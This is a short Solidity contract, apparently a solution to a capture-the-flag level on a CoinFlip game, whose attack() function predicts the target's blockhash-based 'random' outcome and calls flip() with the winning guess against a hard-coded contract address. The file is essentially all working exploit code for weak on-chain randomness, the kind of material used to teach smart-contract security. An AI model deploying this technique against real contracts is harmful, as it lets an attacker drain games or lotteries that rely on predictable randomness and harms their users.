// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";

/** 
 * The CoinFlip contract uses a known source of randomness, so we can use it to compute the
 * outcome of a coin flip.
 */
contract Level3 {
  using SafeMath for uint256;

  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  CoinFlip cf = CoinFlip(0x0f99264F0f98D9B72866f1e3a521B5F95B35133a);

  function attack() public {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
    cf.flip(blockValue.div(FACTOR) == 1);
  }
}

abstract contract CoinFlip {
  function flip(bool _guess) virtual public returns (bool);
}
